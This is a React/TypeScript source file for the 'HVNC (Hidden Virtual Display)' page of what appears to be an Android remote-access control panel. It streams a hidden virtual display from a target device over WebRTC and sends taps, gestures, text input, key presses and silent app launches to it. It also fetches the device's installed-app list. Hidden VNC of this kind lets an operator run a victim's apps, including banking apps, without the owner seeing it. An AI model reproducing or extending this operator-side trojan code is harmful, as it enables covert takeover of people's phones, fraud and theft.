import { useState, useCallback, useRef, useEffect } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, AppEntry } from '@/types';
import { CMD } from '@/types';
import { clientsApi } from '@/services/api';
import { DevicePageHeader, ErrorAlert, StatusBadge } from '@/components/device/shared';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { mapPointerToDevice, type DevicePoint } from '@/lib/remoteDesktop';
import {
  onHvncStopped,
  onHvncStatus,
  onHvncError,
  onHvncAnswer,
  onHvncIce,
  subscribeToHvnc,
} from '@/services/socket';
import {
  MonitorSmartphone,
  ArrowLeft,
  Home,
  LayoutGrid,
  Send,
  AlertTriangle,
  Radio,
  Plug,
  Loader2,
  Unplug,
  Volume1,
  Volume2,
  RefreshCw,
  Play,
  Settings2
} from 'lucide-react';

type ConnectionState = 'disconnected' | 'connecting' | 'connected';
type GesturePoint = DevicePoint;
type HvncInfoMessage = {
  type: 'hvnc-info';
  virtualWidth: number;
  virtualHeight: number;
  displayId?: number;
  densityDpi?: number;
};

function makeSessionId(): string {
  return globalThis.crypto?.randomUUID?.() || `${Date.now()}-${Math.random().toString(36).slice(2)}`;
}

// TODO: Replace inline WebRTC logic below with the shared useWebRtcSession hook
// (see @/hooks/useWebRtcSession). Currently Screen.tsx and Hvnc.tsx duplicate
// the same WebRTC session management, stats collection, and DataChannel handling.

export default function HvncPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const [connectionState, setConnectionState] = useState<ConnectionState>('disconnected');
  const [virtualWidth, setVirtualWidth] = useState(720);
  const [virtualHeight, setVirtualHeight] = useState(1280);
  const [densityDpi, setDensityDpi] = useState(320);
  const [displayId, setDisplayId] = useState<number | null>(null);

  const [videoAspect, setVideoAspect] = useState(720 / 1280);
  const [fps, setFps] = useState(0);
  const [bitrateKbps, setBitrateKbps] = useState(0);
  const [connectionMode, setConnectionMode] = useState<'P2P' | 'TURN' | null>(null);
  const [relayAvailable, setRelayAvailable] = useState<boolean | null>(null);
  const [controlReady, setControlReady] = useState(false);
  const [screenError, setScreenError] = useState<string | null>(null);
  const [textInput, setTextInput] = useState('');
  const [selectedApp, setSelectedApp] = useState('');

  const viewportRef = useRef<HTMLDivElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const dataChannelRef = useRef<RTCDataChannel | null>(null);
  const sessionRef = useRef('');
  const pendingRemoteIceRef = useRef<RTCIceCandidateInit[]>([]);
  const connectTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const statsTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastStatsRef = useRef<{ bytes: number; time: number } | null>(null);
  const gestureRef = useRef<{ points: GesturePoint[]; startedAt: number; lastAt: number; live: boolean } | null>(null);
  const screenSizeRef = useRef({ width: 720, height: 1280 });
  const videoAspectRef = useRef(720 / 1280);

  const { sendCommand, commandStatus } = useDeviceData<Record<string, never>>({
    clientId,
    page: 'hvnc',
    extractData: () => ({}),
    dataType: 'hvnc',
    defaultValue: {},
    socketDebounceMs: 5000,
  });

  const { data: appsData, sendCommand: sendAppsCommand, loading: loadingApps } = useDeviceData<AppEntry[]>({
    clientId,
    page: 'apps',
    extractData: (res) => (Array.isArray(res) ? res : []),
    dataType: 'apps',
    defaultValue: [],
  });

  useEffect(() => {
    if (online && appsData.length === 0) {
      void sendAppsCommand(CMD.APPS, {});
    }
  }, [online, appsData.length, sendAppsCommand]);

  const applyScreenSize = useCallback((width: number, height: number) => {
    if (!Number.isFinite(width) || !Number.isFinite(height) || width < 2 || height < 2) return;
    setVirtualWidth(width);
    setVirtualHeight(height);
    screenSizeRef.current = { width, height };
    const aspect = width / height;
    setVideoAspect(aspect);
    videoAspectRef.current = aspect;
  }, []);

  const clearTimers = useCallback(() => {
    if (connectTimeoutRef.current) clearTimeout(connectTimeoutRef.current);
    if (statsTimerRef.current) clearInterval(statsTimerRef.current);
    connectTimeoutRef.current = null;
    statsTimerRef.current = null;
    lastStatsRef.current = null;
  }, []);

  const closePeer = useCallback(() => {
    clearTimers();
    const activeGesture = gestureRef.current;
    const channel = dataChannelRef.current;
    if (activeGesture?.live && channel?.readyState === 'open') {
      const point = activeGesture.points[activeGesture.points.length - 1];
      try { channel.send(JSON.stringify({ action: 'touchEnd', ...point })); } catch { /* peer is already closing */ }
    }
    gestureRef.current = null;
    try { dataChannelRef.current?.close(); } catch { /* already closed */ }
    dataChannelRef.current = null;
    try { peerRef.current?.close(); } catch { /* already closed */ }
    peerRef.current = null;
    sessionRef.current = '';
    pendingRemoteIceRef.current = [];
    if (videoRef.current) videoRef.current.srcObject = null;
    setControlReady(false);
    setConnectionState('disconnected');
    setConnectionMode(null);
    setFps(0);
    setBitrateKbps(0);
    setDisplayId(null);
  }, [clearTimers]);

  const collectStats = useCallback(async () => {
    const pc = peerRef.current;
    if (!pc) return;
    try {
      const report = await pc.getStats();
      let selectedPairId = '';
      report.forEach((item) => {
        if (item.type === 'transport' && item.selectedCandidatePairId) {
          selectedPairId = item.selectedCandidatePairId as string;
        }
        if (item.type === 'inbound-rtp' && item.kind === 'video') {
          if (typeof item.framesPerSecond === 'number') setFps(Math.round(item.framesPerSecond));
          if (typeof item.bytesReceived === 'number') {
            const now = performance.now();
            const previous = lastStatsRef.current;
            if (previous && now > previous.time) {
              setBitrateKbps(Math.round(((item.bytesReceived - previous.bytes) * 8) / (now - previous.time)));
            }
            lastStatsRef.current = { bytes: item.bytesReceived, time: now };
          }
        }
      });
      const pair = selectedPairId ? report.get(selectedPairId) : undefined;
      const local = pair?.localCandidateId ? report.get(pair.localCandidateId as string) : undefined;
      const remote = pair?.remoteCandidateId ? report.get(pair.remoteCandidateId as string) : undefined;
      if (local || remote) {
        setConnectionMode(local?.candidateType === 'relay' || remote?.candidateType === 'relay' ? 'TURN' : 'P2P');
      }
    } catch {
      // Peer may have closed between timer ticks.
    }
  }, []);

  const bindDataChannel = useCallback((channel: RTCDataChannel) => {
    dataChannelRef.current = channel;
    channel.onopen = () => {
      if (dataChannelRef.current === channel) setControlReady(true);
    };
    channel.onclose = () => {
      if (dataChannelRef.current === channel) setControlReady(false);
    };
    channel.onerror = () => {
      if (dataChannelRef.current === channel) setControlReady(false);
    };
    channel.onmessage = (event) => {
      if (typeof event.data !== 'string') return;
      try {
        const message = JSON.parse(event.data);
        // Handle heartbeat from Android
        if (message.type === 'heartbeat') {
          if (channel.readyState === 'open') {
            try { channel.send(JSON.stringify({ type: 'heartbeat_ack' })); } catch { /* ignore */ }
          }
          return;
        }
        // Handle display info
        if (message.type === 'hvnc-info') {
          if (message.virtualWidth && message.virtualHeight) {
            applyScreenSize(message.virtualWidth, message.virtualHeight);
          }
          if (message.displayId !== undefined) {
            setDisplayId(message.displayId);
          }
          if (message.densityDpi) {
            setDensityDpi(message.densityDpi);
          }
        }
      } catch {
        // Ignore unknown messages.
      }
    };
  }, [applyScreenSize]);

  const detachSession = useCallback((targetSession: string) => {
    if (!targetSession) return;
    void clientsApi.sendCommand(clientId, CMD.HVNC, {
      action: 'detach',
      sessionId: targetSession,
    }).catch(() => {});
  }, [clientId]);

  const handleConnect = useCallback(async () => {
    detachSession(sessionRef.current);
    closePeer();
    setScreenError(null);
    setConnectionState('connecting');
    const sessionId = makeSessionId();
    sessionRef.current = sessionId;

    try {
      const configResponse = await clientsApi.getWebRtcConfig(clientId);
      const iceServers = (configResponse.data?.data?.iceServers || []) as RTCIceServer[];
      const hasTurn = configResponse.data?.data?.turnConfigured === true || iceServers.some((server) => {
        const urls = Array.isArray(server.urls) ? server.urls : [server.urls];
        return urls.some((url) => url.startsWith('turn:') || url.startsWith('turns:'));
      });
      setRelayAvailable(hasTurn);
      const pc = new RTCPeerConnection({
        iceServers,
        bundlePolicy: 'max-bundle',
        iceCandidatePoolSize: 2,
      });
      peerRef.current = pc;

      const control = pc.createDataChannel('control', { ordered: true });
      bindDataChannel(control);
      pc.addTransceiver('video', { direction: 'recvonly' });

      pc.ontrack = (event) => {
        const stream = event.streams[0] || new MediaStream([event.track]);
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          void videoRef.current.play().catch(() => {});
        }
      };
      pc.ondatachannel = (event) => bindDataChannel(event.channel);
      pc.onicecandidate = (event) => {
        if (!event.candidate || sessionRef.current !== sessionId) return;
        void clientsApi.sendCommand(clientId, CMD.HVNC_ICE, {
          sessionId,
          candidate: event.candidate.candidate,
          sdpMid: event.candidate.sdpMid,
          sdpMLineIndex: event.candidate.sdpMLineIndex,
        }).catch(() => {});
      };
      pc.onconnectionstatechange = () => {
        if (peerRef.current !== pc) return;
        if (pc.connectionState === 'connected') {
          setConnectionState('connected');
          setScreenError(null);
          if (connectTimeoutRef.current) clearTimeout(connectTimeoutRef.current);
          if (!statsTimerRef.current) {
            statsTimerRef.current = setInterval(() => void collectStats(), 1000);
          }
        } else if (pc.connectionState === 'failed') {
          setScreenError('WebRTC connection failed. Check TURN/firewall configuration.');
          detachSession(sessionId);
          closePeer();
        } else if (pc.connectionState === 'disconnected') {
          setConnectionState('connecting');
        }
      };

      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);

      await sendCommand(CMD.HVNC, {
        action: 'start',
        sessionId,
        virtualWidth,
        virtualHeight,
        densityDpi
      });
      await sendCommand(CMD.HVNC_OFFER, {
        sessionId,
        sdp: offer.sdp,
        iceServers,
      });

      connectTimeoutRef.current = setTimeout(() => {
        if (sessionRef.current === sessionId && peerRef.current?.connectionState !== 'connected') {
          setScreenError('Connection timed out. Verify TURN configuration.');
          detachSession(sessionId);
          closePeer();
        }
      }, 60_000);
    } catch {
      setScreenError('Unable to initialize the WebRTC session.');
      detachSession(sessionId);
      closePeer();
    }
  }, [bindDataChannel, clientId, closePeer, collectStats, detachSession, sendCommand, virtualWidth, virtualHeight, densityDpi]);

  const handleDisconnect = useCallback(() => {
    void sendCommand(CMD.HVNC, { action: 'stop' });
    detachSession(sessionRef.current);
    closePeer();
  }, [closePeer, detachSession, sendCommand]);

  useEffect(() => {
    const unsub = subscribeToHvnc(clientId);
    return () => {
      unsub();
      const sessionId = sessionRef.current;
      detachSession(sessionId);
      closePeer();
    };
  }, [clientId, closePeer, detachSession]);

  useEffect(() => {
    const unsubAnswer = onHvncAnswer(async (payload) => {
      const pc = peerRef.current;
      if (!pc || payload.id !== clientId || payload.sessionId !== sessionRef.current) return;
      try {
        await pc.setRemoteDescription({ type: 'answer', sdp: payload.sdp });
        for (const candidate of pendingRemoteIceRef.current.splice(0)) {
          await pc.addIceCandidate(candidate);
        }
      } catch {
        setScreenError('The device returned an invalid WebRTC answer.');
        detachSession(sessionRef.current);
        closePeer();
      }
    });
    const unsubIce = onHvncIce(async (payload) => {
      const pc = peerRef.current;
      if (!pc || payload.id !== clientId || payload.sessionId !== sessionRef.current) return;
      const candidate: RTCIceCandidateInit = {
        candidate: payload.candidate,
        sdpMid: payload.sdpMid,
        sdpMLineIndex: payload.sdpMLineIndex,
      };
      if (pc.remoteDescription) {
        try { await pc.addIceCandidate(candidate); } catch { /* stale candidate */ }
      } else {
        pendingRemoteIceRef.current.push(candidate);
      }
    });
    const unsubStatus = onHvncStatus((payload) => {
      if (payload.id !== clientId) return;
      if (payload.virtualWidth && payload.virtualHeight) {
        applyScreenSize(payload.virtualWidth, payload.virtualHeight);
      }
      if (payload.displayId !== undefined) setDisplayId(payload.displayId);
      if (payload.densityDpi !== undefined) setDensityDpi(payload.densityDpi);

      const terminalStates = new Set(['stopped', 'closed']);
      if (
        payload.streaming === false
        && payload.sessionId === sessionRef.current
        && terminalStates.has(payload.connectionState || '')
      ) {
        closePeer();
      }
    });
    const unsubStopped = onHvncStopped((payload) => {
      if (payload.id === clientId) closePeer();
    });
    const unsubError = onHvncError((payload) => {
      if (payload.id !== clientId) return;
      if (payload.sessionId && payload.sessionId !== sessionRef.current) return;
      setScreenError(payload.error);
      const activeSession = sessionRef.current;
      detachSession(activeSession);
      closePeer();
    });
    return () => {
      unsubAnswer();
      unsubIce();
      unsubStatus();
      unsubStopped();
      unsubError();
    };
  }, [applyScreenSize, clientId, closePeer, detachSession]);

  useEffect(() => {
    if (online) {
      void sendCommand(CMD.HVNC, { action: 'status' });
    }
  }, [online, sendCommand]);

  const sendControl = useCallback((action: string, payload: Record<string, unknown> = {}) => {
    const message = JSON.stringify({ action, ...payload });
    const channel = dataChannelRef.current;
    if (channel?.readyState === 'open') {
      try {
        channel.send(message);
        return;
      } catch {
        // Fall through to authenticated Socket.IO signaling.
      }
    }
    void sendCommand(CMD.HVNC_CTRL, { action, ...payload })
      .catch(() => setScreenError('Unable to send the remote-control action.'));
  }, [sendCommand]);

  const sendLiveTouch = useCallback((action: 'touchStart' | 'touchMove' | 'touchEnd', point: GesturePoint): boolean => {
    const channel = dataChannelRef.current;
    if (channel?.readyState !== 'open') return false;
    if (action === 'touchMove' && channel.bufferedAmount > 64 * 1024) return true;
    try {
      channel.send(JSON.stringify({ action, ...point }));
      return true;
    } catch {
      return false;
    }
  }, []);

  const getPointer = useCallback((clientX: number, clientY: number) => {
    const viewport = viewportRef.current;
    const { width, height } = screenSizeRef.current;
    if (!viewport) return null;
    return mapPointerToDevice(
      clientX,
      clientY,
      viewport.getBoundingClientRect(),
      width,
      height,
      videoAspectRef.current,
    );
  }, []);

  const handlePointerDown = (event: React.PointerEvent<HTMLDivElement>) => {
    if (connectionState !== 'connected') return;
    const point = getPointer(event.clientX, event.clientY);
    if (!point) return;
    event.currentTarget.setPointerCapture(event.pointerId);
    const now = Date.now();
    const live = sendLiveTouch('touchStart', point);
    gestureRef.current = { points: [point], startedAt: now, lastAt: now, live };
  };

  const handlePointerMove = (event: React.PointerEvent<HTMLDivElement>) => {
    const gesture = gestureRef.current;
    if (!gesture || Date.now() - gesture.lastAt < 16) return;
    const point = getPointer(event.clientX, event.clientY);
    if (!point) return;
    const previous = gesture.points[gesture.points.length - 1];
    if (Math.hypot(point.x - previous.x, point.y - previous.y) >= 2) {
      gesture.points.push(point);
      gesture.lastAt = Date.now();
      if (gesture.live) sendLiveTouch('touchMove', point);
    }
  };

  const handlePointerUp = (event: React.PointerEvent<HTMLDivElement>) => {
    const gesture = gestureRef.current;
    gestureRef.current = null;
    if (!gesture) return;
    const end = getPointer(event.clientX, event.clientY);
    if (end) gesture.points.push(end);
    const duration = Math.max(1, Math.min(Date.now() - gesture.startedAt, 60_000));
    const first = gesture.points[0];
    const last = gesture.points[gesture.points.length - 1];
    const distance = Math.hypot(last.x - first.x, last.y - first.y);
    if (gesture.live) {
      if (!sendLiveTouch('touchEnd', last)) sendControl('touchEnd', last);
      return;
    }
    if (distance < 12 && duration < 250) {
      sendControl('tap', last);
    } else {
      const points = gesture.points.length <= 256
        ? gesture.points
        : Array.from({ length: 256 }, (_, index) => gesture.points[Math.round(index * (gesture.points.length - 1) / 255)]);
      sendControl('gesture', { points, duration });
    }
  };

  const handlePointerCancel = () => {
    const gesture = gestureRef.current;
    gestureRef.current = null;
    if (gesture?.live) {
      const last = gesture.points[gesture.points.length - 1];
      if (!sendLiveTouch('touchEnd', last)) sendControl('touchEnd', last);
    }
  };

  const handleVideoMetadata = () => {
    const video = videoRef.current;
    if (!video?.videoWidth || !video.videoHeight) return;
    const aspect = video.videoWidth / video.videoHeight;
    setVideoAspect(aspect);
    videoAspectRef.current = aspect;
    if (!screenSizeRef.current.width || !screenSizeRef.current.height) {
      applyScreenSize(video.videoWidth, video.videoHeight);
    }
  };

  const sendText = () => {
    if (!textInput) return;
    sendControl('text', { text: textInput });
    setTextInput('');
  };

  const launchApp = () => {
    if (!selectedApp) return;
    void sendCommand(CMD.HVNC, { action: 'launchApp', packageName: selectedApp });
  };

  const resizeVirtualDisplay = () => {
    void sendCommand(CMD.HVNC, { action: 'resize', virtualWidth, virtualHeight, densityDpi });
  };

  const connected = connectionState === 'connected';
  const connecting = connectionState === 'connecting';
  const resolutionLabel = virtualWidth && virtualHeight ? `${virtualWidth}×${virtualHeight}` : '—';
  const viewportStyle = {
    aspectRatio: `${videoAspect}`,
    width: `min(100%, calc(68vh * ${videoAspect}))`,
    maxHeight: '68vh',
  };

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="HVNC (Hidden Virtual Display)"
        subtitle={connected ? `Encrypted ${connectionMode || 'WebRTC'} HVNC session` : 'Hidden virtual display and background control'}
        commandStatus={commandStatus}
        badge={connected ? { label: 'LIVE', variant: 'destructive', className: 'animate-pulse' } : undefined}
        actions={connected ? [{ label: 'Stop HVNC', icon: Unplug, onClick: handleDisconnect, variant: 'destructive' }] : []}
      />

      {relayAvailable === false && (
        <div className="flex items-start gap-3 rounded-xl border border-warning/30 bg-warning/5 p-4">
          <AlertTriangle className="h-5 w-5 shrink-0 text-warning" />
          <div>
            <p className="text-sm font-medium">TURN relay is not configured</p>
            <p className="text-xs text-muted-foreground">P2P can still work, but cross-network access is not guaranteed behind CGNAT or strict firewalls.</p>
          </div>
        </div>
      )}
      {screenError && <ErrorAlert message={screenError} onRetry={handleConnect} />}

      <div className="flex flex-wrap items-center gap-2">
        <StatusBadge label={connected ? `${connectionMode || 'WebRTC'} connected` : connecting ? 'Connecting HVNC…' : 'Disconnected'} status={connected ? 'success' : connecting ? 'warning' : 'neutral'} />
        {connected && <StatusBadge label={`${fps} FPS`} status="neutral" />}
        {connected && <StatusBadge label={`${bitrateKbps} kbps`} status="neutral" />}
        {connected && <StatusBadge label={resolutionLabel} status="neutral" />}
        {connected && displayId !== null && <StatusBadge label={`Display #${displayId}`} status="neutral" />}
        {connected && <StatusBadge label={controlReady ? 'DataChannel ready' : 'Control fallback'} status={controlReady ? 'success' : 'warning'} />}
      </div>

      <div className="grid gap-4 lg:grid-cols-[1fr_20rem]">
        {/* Left side: Video Viewport */}
        <div className="flex flex-col gap-4">
          <div className="relative overflow-hidden rounded-2xl border border-border/60 bg-black/90 shadow-xl self-start w-full">
            <div
              ref={viewportRef}
              className={`relative mx-auto select-none touch-none ${connected ? 'cursor-crosshair' : ''}`}
              style={viewportStyle}
              onPointerDown={handlePointerDown}
              onPointerMove={handlePointerMove}
              onPointerUp={handlePointerUp}
              onPointerCancel={handlePointerCancel}
            >
              <video
                ref={videoRef}
                autoPlay
                muted
                playsInline
                onLoadedMetadata={handleVideoMetadata}
                onResize={handleVideoMetadata}
                className={`absolute inset-0 h-full w-full object-contain pointer-events-none ${connected ? '' : 'hidden'}`}
              />

              {!connected && (
                <div className="absolute inset-0 flex flex-col items-center justify-center gap-6 p-4 text-center">
                  {connecting ? (
                    <>
                      <Loader2 className="h-16 w-16 animate-spin text-primary" />
                      <p className="text-sm font-semibold text-primary">Starting virtual display...</p>
                    </>
                  ) : (
                    <>
                      <button onClick={handleConnect} disabled={!online} className="rounded-full bg-primary/10 hover:bg-primary/20 p-8 shadow-lg disabled:opacity-50 transition-colors">
                        {online ? <MonitorSmartphone className="h-16 w-16 text-primary" /> : <MonitorSmartphone className="h-16 w-16 text-muted-foreground" />}
                      </button>
                      <p className="font-semibold">{online ? 'Start Hidden VNC' : 'Device is offline'}</p>
                    </>
                  )}
                </div>
              )}
              {connected && (
                <div className="absolute left-3 top-3 flex items-center gap-1.5 rounded-full bg-red-500/90 px-2.5 py-1 text-[10px] font-semibold text-white">
                  <Radio className="h-3 w-3 animate-pulse" /> HVNC
                </div>
              )}
            </div>
          </div>

          {connected && (
            <div className="flex gap-2">
              <Input
                value={textInput}
                onChange={(event) => setTextInput(event.target.value)}
                onKeyDown={(event) => { if (event.key === 'Enter') sendText(); }}
                placeholder="Type text into the focused field on the virtual display"
              />
              <Button onClick={sendText} disabled={!textInput}><Send className="mr-2 h-4 w-4" />Send</Button>
            </div>
          )}
        </div>

        {/* Right side: Controls & Settings */}
        <div className="flex flex-col gap-4">
          <div className="rounded-xl border bg-card p-4 space-y-4">
            <h3 className="text-sm font-semibold flex items-center gap-2">
              <MonitorSmartphone className="h-4 w-4" /> Device Controls
            </h3>

            <div className="grid grid-cols-3 gap-2">
              <Button variant="outline" size="sm" title="Back" disabled={!connected} onClick={() => sendControl('key', { keyCode: 'back' })}>
                <ArrowLeft className="h-4 w-4" />
              </Button>
              <Button variant="outline" size="sm" title="Home" disabled={!connected} onClick={() => sendControl('key', { keyCode: 'home' })}>
                <Home className="h-4 w-4" />
              </Button>
              <Button variant="outline" size="sm" title="Recent apps" disabled={!connected} onClick={() => sendControl('key', { keyCode: 'recents' })}>
                <LayoutGrid className="h-4 w-4" />
              </Button>
            </div>
          </div>

          <div className="rounded-xl border bg-card p-4 space-y-4">
            <h3 className="text-sm font-semibold flex items-center gap-2">
              <Play className="h-4 w-4" /> App Launcher
            </h3>
            <p className="text-xs text-muted-foreground">Launch an app silently on the virtual display.</p>
            <div className="space-y-2">
              <div className="flex gap-2">
                <select
                  value={selectedApp}
                  onChange={(e) => setSelectedApp(e.target.value)}
                  disabled={appsData.length === 0}
                  className="flex h-9 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  <option value="" disabled hidden>
                    {loadingApps ? 'Loading apps...' : 'Select app...'}
                  </option>
                  {appsData.map((app, i) => (
                    <option key={i} value={app.packageName}>
                      {app.name || app.packageName}
                    </option>
                  ))}
                </select>
                <Button
                  variant="outline"
                  size="icon"
                  className="h-9 w-9 shrink-0"
                  onClick={() => sendAppsCommand(CMD.APPS, {})}
                  disabled={loadingApps || !online}
                  title="Refresh Apps"
                >
                  <RefreshCw className={`h-4 w-4 ${loadingApps ? 'animate-spin' : ''}`} />
                </Button>
              </div>
              <Button className="w-full" disabled={!connected || !selectedApp} onClick={launchApp}>
                Launch App
              </Button>
            </div>
          </div>

          <div className="rounded-xl border bg-card p-4 space-y-4">
            <h3 className="text-sm font-semibold flex items-center gap-2">
              <Settings2 className="h-4 w-4" /> Display Settings
            </h3>

            <div className="grid grid-cols-2 gap-3">
              <div className="space-y-1">
                <Label className="text-xs">Width</Label>
                <Input
                  type="number"
                  value={virtualWidth}
                  onChange={e => setVirtualWidth(parseInt(e.target.value) || 0)}
                  disabled={connected}
                  className="h-8 text-sm"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Height</Label>
                <Input
                  type="number"
                  value={virtualHeight}
                  onChange={e => setVirtualHeight(parseInt(e.target.value) || 0)}
                  disabled={connected}
                  className="h-8 text-sm"
                />
              </div>
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Density (DPI)</Label>
              <Input
                type="number"
                value={densityDpi}
                onChange={e => setDensityDpi(parseInt(e.target.value) || 0)}
                disabled={connected}
                className="h-8 text-sm"
              />
            </div>

            {connected && (
              <Button variant="secondary" size="sm" className="w-full" onClick={resizeVirtualDisplay}>
                Apply Resize
              </Button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
